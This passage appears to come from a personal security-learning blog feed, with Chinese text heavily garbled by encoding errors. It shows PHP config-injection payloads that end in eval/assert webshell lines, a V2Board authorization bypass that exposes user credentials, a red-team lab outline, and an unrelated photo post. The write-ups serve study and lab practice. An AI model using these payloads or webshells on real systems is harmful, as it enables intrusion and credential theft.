class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¦æ±‚æ˜¯è¦<code>getshell</code>,è¿™ä¸ªåœºæ™¯ååˆ†ç»å…¸ï¼Œå¸¸ç”¨åœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶å†™å…¥çš„æ—¶å€™ã€‚<br>æ­¤å¤„ä¸å­˜åœ¨ä¹‹å‰è¯´çš„é‚£ä¸ªé…ç½®æ–‡ä»¶ä¸­ç”¨çš„æ˜¯<code>â€åŒå¼•å·â€</code>å¼•èµ·ä»»æ„ä»£ç æ‰§è¡Œçš„é—®é¢˜,è¿™è¿™é‡Œé¢ç”¨çš„æ˜¯å•å¼•å·,è€Œä¸” <code>addslashes()</code>å¤„ç†è¿‡äº†,çœ‹ä¼¼å¾ˆå®‰å…¨,ä½†æ˜¯å¯¹äºè„‘å­é‡Œæœ‰ä¸ªé»‘æ´çš„æå®‰å…¨çš„äººæ¥è®²,è¿™ä¸ªè¿˜çœŸæ˜¯æœ‰é—®é¢˜çš„.</p><h2 id="æ–¹æ³•ä¸€-åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•ä¸€,åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜"></a>æ–¹æ³•ä¸€,åˆ©ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„é—®é¢˜</h2><p>å¯ä»¥çœ‹åˆ°æ­£åˆ™åŒ¹é…çš„æ˜¯ä»¥ä¸‹å†…å®¹:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;ä»»æ„å†…å®¹&#x27;</span></span><br></pre></td></tr></table></figure><p>ä»»æ„å†…å®¹é‡Œé¢æ˜¯å¯ä»¥åŒ…å«è½¬ç§»ç¬¦ <code>\</code> çš„,æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œç¬¬ä¸€ä¸ªä¹‹å,<code>config.php</code>ä¸­çš„å†…å®¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·å¹¶æ²¡æœ‰åŠæ³•æ‰§è¡Œ<code>phpinfo()</code>,å› ä¸ºæˆ‘ä»¬æ’å…¥çš„ å•å¼•å· è¢«è½¬ç§»æ‰äº†,æ‰€ä»¥<code>phpinfo()</code>è¿˜æ˜¯åœ¨å•å¼•å·çš„åŒ…è£¹ä¹‹å†….<br>æˆ‘ä»¬åœ¨è®¿é—®ä¸‹é¢è¿™ä¸ª</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ­£åˆ™ <code>.*</code> ä¼šåŒ¹é…è¡Œå†…çš„ä»»æ„å­—ç¬¦æ— æ•°æ¬¡.æ‰€ä»¥ <code>\</code> ä¹Ÿè¢«è®¤ä¸ºæ˜¯å…¶ä¸­çš„ä¸€éƒ¨åˆ†,ä¹Ÿä¼šè¢«æ›¿æ¢æ‰,æ‰§è¡Œå®Œä¹‹å,<code>config.php</code>ä¸­çš„å†…å®¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure><p>è½¬ä¹‰ç¬¦å°±è¢«æ›¿æ¢æ‰äº†,å°±æˆåŠŸçš„<code>getshell</code>.</p><h2 id="æ–¹æ³•äºŒ-åˆ©ç”¨-preg-replaceå‡½æ•°çš„é—®é¢˜"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨-preg-replaceå‡½æ•°çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•äºŒ,åˆ©ç”¨ preg_replaceå‡½æ•°çš„é—®é¢˜:"></a>æ–¹æ³•äºŒ,åˆ©ç”¨ preg_replaceå‡½æ•°çš„é—®é¢˜:</h2><p>ç”¨<code>preg_replace()</code>çš„æ—¶å€™<code>replacement(ç¬¬äºŒä¸ªå‚æ•°)</code>ä¹Ÿè¦ç»è¿‡æ­£åˆ™å¼•æ“å¤„ç†ï¼Œæ‰€ä»¥æ­£åˆ™å¼•æ“æŠŠ<code>\\</code>è½¬ä¹‰æˆäº†<code>\</code><br>ä¹Ÿå°±æ˜¯è¯´å¦‚æœå­—ç¬¦ä¸²æ˜¯<code>\\\&amp;#39;</code>,ç»è¿‡ <code>preg_replace()</code>çš„å¤„ç†,å°±å˜ä¸º <code>#39;</code>,å•å¼•å·å°±é€ƒå‡ºæ¥äº†.<br>æ‰€ä»¥<code>payload</code>å¦‚ä¸‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure><p><code>config.php</code>å˜ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure><p>**é“ç†å°±æ˜¯  <code>a\&amp;#39;;phpinfo();//</code>  ç»è¿‡ <code>addslashes()</code>å¤„ç†ä¹‹å,å˜ä¸º<code>a\\\&amp;#39;;phpinfo();//</code> ç„¶åä¸¤ä¸ªåæ–œæ è¢«<code>preg_replace</code>å˜æˆäº†ä¸€ä¸ª,å¯¼è‡´å•å¼•å·é€ƒè„±.</p><h2 id="æ–¹æ³•ä¸‰-åˆ©ç”¨-preg-replace-å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜"><a href="#æ–¹æ³•ä¸‰-åˆ©ç”¨-preg-replace-å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜" class="headerlink" title="æ–¹æ³•ä¸‰, åˆ©ç”¨ preg_replace() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜"></a>æ–¹æ³•ä¸‰, åˆ©ç”¨ preg_replace() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜</h2><p>å…ˆçœ‹å®˜æ–¹å¯¹<code>preg_replace()</code>å‡½æ•°çš„æè¿°<code>manual</code><br>å‡½æ•°åŸå‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure><p>å¯¹<code>replacement</code>çš„æè¿°.<br><code>replacement</code>ä¸­å¯ä»¥åŒ…å«å</p><p>å‘<code>å¼•ç”¨\\næˆ–(php 4.0.4ä»¥ä¸Šå¯ç”¨)$n</code>ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ª è¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬<code>n</code>ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ <code>n</code> å¯ä»¥æ˜¯<code>0-99</code>ï¼Œ<code>\\0</code>å’Œ<code>$0</code>ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= æˆ–è€… http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¬¬ä¸€æ¡å<code>config.php</code>çš„å†…å®¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å†æ‰§è¡Œç¬¬äºŒæ¡å<code>config.php</code>çš„å†…å®¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åˆšå¥½é—­åˆæ‰äº†å‰åçš„ä¸¤ä¸ªå•å¼•å·ä¸­é—´çš„é€ƒè„±å‡ºæ¥äº†.æƒ³å‡ºè¿™ä¸ªåŠæ³•çš„äºº,æ€è·¯çœŸæ˜¯å¯ä»¥çš„.</p><hr><p>è¦<code>getshell</code>ç›´æ¥</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æŠŠ<span class="built_in">phpinfo</span>()æ›¿æ¢æˆ</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">èšå‰‘è¿æ¥å³å¯</span><br></pre></td></tr></table></figure><hr><h1 id="V2Board-v1-6-1-è¶Šæƒè®¿é—®æ¼æ´"><a href="#V2Board-v1-6-1-è¶Šæƒè®¿é—®æ¼æ´" class="headerlink" title="V2Board  v1.6.1 è¶Šæƒè®¿é—®æ¼æ´"></a>V2Board  v1.6.1 è¶Šæƒè®¿é—®æ¼æ´</h1><p>è¿™æ˜¯åœ¨æŸæ¬¡æ¯”èµ›é‡åˆ°çš„ä¸€é“é¢˜ï¼Œåªæ‹¿äº†é¢˜ç›®ä¸“é—¨æ¥è®°å½•è¿™ä¸ªæ¼æ´ï¼Œå¹¶æ²¡ä¸‹è½½ä»£ç æµ‹è¯•</p><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a><strong>æ¼æ´æè¿°</strong></h2><p><code>V2board</code>é¢æ¿ <code>Admin.php</code> å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œç”±äºéƒ¨åˆ†é‰´æƒä»£ç äº<code>v1.6.1</code>ç‰ˆæœ¬è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‰´æƒæ–¹å¼å˜ä¸ºä»<code>Redis</code>ä¸­è·å–ç¼“å­˜åˆ¤å®šæ˜¯å¦å­˜åœ¨å¯ä»¥è°ƒç”¨æ¥å£ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥è°ƒç”¨ç®¡ç†å‘˜æƒé™çš„æ¥å£è·å–åå°æƒé™</p><p>ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä»ç¼“å­˜ä¸­æ¥åˆ¤æ–­æƒé™ï¼Œä¸€æ—¦åˆ¤æ–­æˆåŠŸï¼Œå°±å¯ä»¥ä»¥<code>admin</code>èº«ä»½å»è®¿é—®å…¶ä»–ä¸å¯è®¿é—®çš„æ•æ„Ÿå†…å®¹ï¼Œæ¯”å¦‚<code>admin</code>çš„å¯†ç ç­‰ç­‰</p><h2 id="æ¼æ´ä»£ç åˆ†æ"><a href="#æ¼æ´ä»£ç åˆ†æ" class="headerlink" title="æ¼æ´ä»£ç åˆ†æ"></a>æ¼æ´ä»£ç åˆ†æ</h2><p>ä»£ç ä½ç½®ï¼š<code>app/Http/Middleware/Admin.php</code></p><p><img src="/2022/11/22/CMS-Test/image-20230113161644874.png" alt="image-20230113161644874"></p><p>è¿™é‡Œçš„ä»£ç å°±æ˜¯åˆ¤æ–­<code>redis</code>ç¼“å­˜ä¸­æ˜¯å¦å­˜åœ¨<code>authorization</code>ï¼Œå¦‚æœå­˜åœ¨å°±å…è®¸è°ƒç”¨<code>admin</code>çš„æ¥å£ï¼Œæ‰€ä»¥ä¸€æ—¦å­˜åœ¨</p><p><code>authorization</code>å°±å¯ä»¥è°ƒç”¨è¯¥æ¥å£ï¼Œä½†æ˜¯å¹¶æ²¡ç”¨è¿›ä¸€æ­¥åˆ¤æ–­<code>authorization</code>ä¸­æ˜¯å¦å±äº<code>admin</code></p><p>ä¸»è¦è¦é€šè¿‡ä¸¤æ¬¡é€»è¾‘å®ç°éªŒè¯ï¼Œä¸€ä¸ªæ˜¯å­˜åœ¨ <code>header</code> ä¸­çš„ <code>authorization</code> å‚æ•°ï¼Œå†ä¸€ä¸ªæ˜¯æ ¡éªŒ <code>authorizations</code> æ˜¯å¦å­˜åœ¨äº<code>Redis</code>ç¼“å­˜ä¸­çš„</p><p>åœ¨è¿”å›åŒ…æ•°æ®ä¸­ï¼Œ</p><p><img src="/2022/11/22/CMS-Test/image-20230113165445597.png" alt="image-20230113165445597"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œåœ¨ç™»å½•æ—¶ä¼šè¿”å›<code>token</code>ï¼Œ<code>auth_data</code></p><p>è€Œ<code>auth_data</code>å’Œ<code>authorization</code>ä¸¤ä¸ªæ ¼å¼éƒ½æ˜¯ä¸€æ ·çš„<code>base64_encode(&quot;username:password&quot;)</code></p><p>ä½†æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¿™é‡Œå°±å¯èƒ½å­˜åœ¨é€»è¾‘æ¼æ´è¶Šæƒ</p><h2 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h2><p>å…ˆè¿›è¡Œæ³¨å†Œä¸€ä¸ªæ™®é€šæƒé™çš„</p><p><img src="/2022/11/22/CMS-Test/image-20230113161201687.png" alt="image-20230113161201687"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è´¦å·ï¼š<span class="symbol">123@</span>qq.com</span><br><span class="line">å¯†ç ï¼š<span class="number">123456789</span></span><br></pre></td></tr></table></figure><p>åœ¨ç™»å½•æ—¶è¿›è¡ŒæŠ“åŒ…</p><p>è¿”å›åŒ…ä¼šè¿”å›æˆ‘ä»¬çš„<code>token</code>å’Œ<code>auth_data</code></p><p><img src="/2022/11/22/CMS-Test/image-20230113165230066.png" alt="image-20230113165230066"></p><p>åŒæ—¶ <code>auth_data</code> ä¼šç¼“å­˜äº <code>Redis</code> ä¸­</p><p>ä½†æ˜¯è¿˜æ˜¯éœ€è¦æŠŠè¿™ä¸ª<code>auth_data</code>å†™è¿›<code>authorization</code></p><p>å¦‚æœä¸å†™å…¥ç›´æ¥è®¿é—®<code>/admin</code>å°±ä¼šå¼¹å‡ºç¦æ­¢ï¼Œå› ä¸ºåœ¨ç¼“å­˜ä¸­æ™®é€šç”¨æˆ·çš„æ•°æ®æ˜¯ä»¥<code>auth_data</code>ï¼Œ</p><p><img src="/2022/11/22/CMS-Test/image-20230113171237926.png" alt="image-20230113171237926"></p><p>æ‰€ä»¥é€šè¿‡ä¸‹é¢è®¿é—®<code>/api/v1/user/info</code>ï¼Œå½“ç„¶è®¿é—®å…¶ä»–ä½ç½®ä¹Ÿå¯ä»¥ï¼Œåªè¦èƒ½æŠŠ<code>authorization</code>å‚æ•°æŠŠæ™®é€šç”¨æˆ·æ•°æ®æ·»åŠ åˆ°è¯·æ±‚ä½“ä¸­ï¼Œå¹¶ä¸”æˆåŠŸå‘é€</p><p>ä»è€Œæ™®é€šç”¨æˆ·çš„æ•°æ®ä¹Ÿä»¥<code>authorization</code>å‚æ•°å½¢å¼ä¿å­˜åˆ°<code>redis</code>ç¼“å­˜ä¸­å»äº†</p><p><img src="/2022/11/22/CMS-Test/image-20230113172957033.png" alt="image-20230113172957033"></p><p>å¦‚ä½•æˆ‘ä»¬å°±å¯ä»¥è®¿é—®<code>admin</code>æ‰å¯ä»¥è®¿é—®çš„ä¿¡æ¯</p><p>æ¯”å¦‚<code>/api/v1/admin/user/fetch</code>ï¼Œè¿™å°±æ˜¯ä»¥<code>admin</code>æŸ¥çœ‹è®¿é—®<code>user</code>çš„ä¿¡æ¯</p><p><img src="/2022/11/22/CMS-Test/image-20230113180827350.png" alt="image-20230113180827350"></p><p>æˆåŠŸè®¿é—®</p><p>å¹¶ä¸”å¾—åˆ°<code>email</code>,<code>password</code>,<code>token</code>ç­‰ä¿¡æ¯</p><p><img src="/2022/11/22/CMS-Test/image-20230113180921938.png" alt="image-20230113180921938"></p><p>æµ‹è¯•å®Œæˆ</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœº</title>
      <link href="/2022/11/13/RedSon/"/>
      <url>/2022/11/13/RedSon/</url>
      
        <content type="html"><![CDATA[<p><code>ç»å…¸é¶åœºï¼Œè™½ç„¶è€ï¼Œä½†æ˜¯è¿˜æ˜¯å€¼å¾—å­¦ä¹ </code></p><span id="more"></span><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><blockquote><p>çº¢é˜Ÿå®æˆ˜ç³»åˆ—ï¼Œä¸»è¦ä»¥çœŸå®ä¼ä¸šç¯å¢ƒä¸ºå®ä¾‹æ­å»ºä¸€ç³»åˆ—é¶åœºï¼Œé€šè¿‡ç»ƒä¹ ã€è§†é¢‘æ•™ç¨‹ã€åšå®¢ä¸‰ä½ä¸€ä½“å­¦ä¹ ã€‚å¦å¤–æœ¬æ¬¡å®æˆ˜å®Œå…¨æ¨¡æ‹ŸATT&amp;CKæ”»å‡»é“¾è·¯è¿›è¡Œæ­å»ºï¼Œå¼€æˆå®Œæ•´é—­ç¯ã€‚åç»­ä¹Ÿä¼šæ­å»ºçœŸå®APTå®æˆ˜ç¯å¢ƒï¼Œä»å®æˆ˜ä¸­æˆé•¿ã€‚å…³äºç¯å¢ƒå¯ä»¥æ¨¡æ‹Ÿå‡ºå„ç§å„æ ·å®æˆ˜è·¯çº¿ï¼Œç›®å‰ç»™å‡ºä½œè€…å®æˆ˜çš„ä¸€å¥—æ”»å‡»å®æˆ˜è·¯çº¿å¦‚ä¸‹ï¼Œè™šæ‹Ÿæœºæ‰€æœ‰ç»Ÿä¸€å¯†ç ï¼šhongrisec@2019ï¼š</p><p>ä¸€ã€ç¯å¢ƒæ­å»º<br>1.ç¯å¢ƒæ­å»ºæµ‹è¯•<br>2.ä¿¡æ¯æ”¶é›†</p><p>äºŒã€æ¼æ´åˆ©ç”¨<br>3.æ¼æ´æœç´¢ä¸åˆ©ç”¨<br>4.åå°Getshellä¸Šä¼ æŠ€å·§<br>5.ç³»ç»Ÿä¿¡æ¯æ”¶é›†<br>6.ä¸»æœºå¯†ç æ”¶é›†</p><p>ä¸‰ã€å†…ç½‘æœé›†<br>7.å†…ç½‘â€“ç»§ç»­ä¿¡æ¯æ”¶é›†<br>8.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“ä¿¡æ¯æ³„éœ²<br>9.å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067<br>10.å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹<br>11.å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“TNSæœåŠ¡æ¼æ´<br>12.å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC DCOMæœåŠ¡æ¼æ´</p><p>å››ã€æ¨ªå‘ç§»åŠ¨<br>13.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-æ–‡ä»¶è¯»å–<br>14.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-redis<br>15.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-redis Getshell<br>16.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-MySQLæ•°æ®åº“<br>17.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-MySQLææƒ</p><p>äº”ã€æ„å»ºé€šé“<br>18.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘</p><p>å…­ã€æŒä¹…æ§åˆ¶<br>19.åŸŸæ¸—é€-åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›†<br>20.åŸŸæ¸—é€-åŸºç¡€æœåŠ¡å¼±å£ä»¤æ¢æµ‹åŠæ·±åº¦åˆ©ç”¨ä¹‹powershell<br>21.åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨]<br>22.åŸŸæ¸—é€-C2å‘½ä»¤æ‰§è¡Œ<br>23.åŸŸæ¸—é€-åˆ©ç”¨DomainFrontingå®ç°å¯¹beaconçš„æ·±åº¦éšè—<br>24.åŸŸæ¸—é€-åŸŸæ§å®ç°ä¸åˆ©ç”¨</p><p>ä¸ƒã€ç—•è¿¹æ¸…ç†<br>25ã€æ—¥å¿—æ¸…ç†</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„è€å©†ç…§ç‰‡</title>
      <link href="/2022/11/04/%E9%AB%98%E6%9C%A8%E3%81%95%E3%82%93/"/>
      <url>/2022/11/04/%E9%AB%98%E6%9C%A8%E3%81%95%E3%82%93/</url>
      
        <content type="html"><![CDATA[<p><strong><code>æ¬¢è¿å¤§å®¶æ¥çœ‹æœ›æˆ‘çš„è€å©†é«˜æœ¨ï¼Œæˆ‘æ˜¯å¥¹çš„è€å…¬Ttoc</code></strong></p><span id="more"></span><p><img src="https://img0.baidu.com/it/u=3167365822,1512350394&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=281" alt="img"></p><p><img src="https://img2.baidu.com/it/u=1274769342,505896326&fm=253&fmt=auto&app=120&f=JPEG?w=478&h=1000" alt="img"></p><p><img src="https://img1.baidu.com/it/u=1567446463,2599104417&fm=253&fmt=auto&app=120&f=JPEG?w=500&h=644" alt="img"></p><p><img src="https://img1.baidu.com/it/u=3529857214,270267501&fm=253&fmt=auto&app=138&f=JPEG?w=400&h=283" alt="img"></p><p><img src="https://img0.baidu.com/it/u=1154622452,3283540884&fm=253&fmt=auto&app=120&f=JPEG?w=641&h=412" alt="img"></p><p><img src="https://img2.baidu.com/it/u=3902004953,3713136265&fm=253&fmt=auto&app=138&f=JPG?w=400&h=217" alt="img"></p><p><img src="https://img0.baidu.com/it/u=789404348,4092425280&fm=253&fmt=auto&app=138&f=JPEG?w=506&h=500" alt="img"></p><p><img src="https://img1.baidu.com/it/u=3163830073,336599065&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=618" alt="img"></p><p><img src="https://img2.baidu.com/it/u=2082028348,3487745437&fm=253&fmt=auto&app=138&f=JPEG?w=890&h=500" alt="img"></p><p><img src="https://img0.baidu.com/it/u=3604510951,366494962&fm=253&fmt=auto&app=138&f=JPG?w=581&h=500" alt="img"></p><p><img src="https://img1.baidu.com/it/u=2843273752,1955020356&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=750" alt="img"></p><p><img src="https://img2.baidu.com/it/u=643317784,4145454445&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=711" alt="img"></p><p><img src="https://img0.baidu.com/it/u=3493245667,4108937152&fm=253&fmt=auto&app=138&f=JPEG?w=347&h=500" alt="img"></p><p><img src="https://img1.baidu.com/it/u=1644934114,1822959849&fm=253&fmt=auto&app=138&f=PNG?w=500&h=282" alt="img"></p><p><img src="https://img2.baidu.com/it/u=1908094365,3745635881&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=677" alt="img"></p><p><img src="https://img0.baidu.com/it/u=2525076093,2619981103&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=708" alt="img"></p><p><img src="https://img2.baidu.com/it/u=3590397336,728101146&fm=253&fmt=auto&app=120&f=JPEG?w=790&h=1000" alt="img"></p><p><img src="https://img0.baidu.com/it/u=1587043172,585553815&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=786" alt="img"></p><p><img src="https://img2.baidu.com/it/u=1658379964,671909388&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=eb46a27a1e605bf5f303b45485d35d9b" alt="img"></p><p><img src="https://img0.baidu.com/it/u=3080117260,965213977&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=4487cbacc6e71e7f7a5569873b01d56c" alt="img"></p><p><img src="https://img2.baidu.com/it/u=2182382835,1489043186&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=f79fb318ababa98b49cd073b54d983c0" alt="img"></p><p><img src="https://img1.baidu.com/it/u=3478366107,3159715980&fm=253&app=120&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=9159e5ca9bbd08407c918cef1374ef8e" alt="img"></p><p><img src="https://img0.baidu.com/it/u=26811461,4127564453&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=483ae587aa1bc88bf5e296cb9cef6931" alt="img"></p><p><img src="https://img2.baidu.com/it/u=2079089821,4287736665&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1667667600&t=535b68d7a3e88d2d302179d58436c519" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> loveâ¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> loveâ¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ è®°å½•</title>
      <link href="/2022/10/25/pwnStudy/"/>
      <url>/2022/10/25/pwnStudy/</url>
      
        <content type="html"><![CDATA[<p><code>å­¦æ ¡å¿…ä¿®å­¦ä¹ ä¸€ä¸‹äºŒè¿›åˆ¶å¦‚ä½•ææƒï¼Œä¸‹é¢è®°å½•ä¸€ä¸‹æˆ‘å­¦ä¹ pwnçš„è®°å½•</code></p><span id="more"></span><h1 id="1-æ­å»ºpwnç¯å¢ƒ"><a href="#1-æ­å»ºpwnç¯å¢ƒ" class="headerlink" title="1.æ­å»ºpwnç¯å¢ƒ"></a>1.æ­å»ºpwnç¯å¢ƒ</h1><p><a href="https://blog.csdn.net/qq_41202237/article/details/118188924?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166606630016782390599725%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166606630016782390599725&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118188924-null-null.142%5Ev58%5Epc_search_tree,201%5Ev3%5Eadd_ask&utm_term=ubuntu20.04pwn&spm=1018.2226.3001.4187">æ¨èæ–‡ç« </a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 